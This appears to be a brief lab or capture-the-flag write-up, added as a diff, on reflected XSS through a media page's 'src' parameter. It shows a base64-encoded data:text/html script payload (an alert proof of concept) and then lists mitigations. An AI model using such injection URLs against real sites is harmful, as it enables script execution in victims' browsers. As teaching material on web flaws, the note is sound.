@@ -1,0 +1,20 @@
+On the page http://IP/  we can see that clickable image
+redirect us to:
+http://IP/?page=media&src=nsa
+
+
+we can change nsa to base64 script
+
+example: 
+<script>alert('test')</script> -> converted to base64 -> PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+
+
+and add the 64base sufix to it in the clickable
+http://IP/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+
+
+
+This works because the request response accept text/html
+
+solution:
+
+- avoid javascript URL's
+- dont't allow text/html in request response
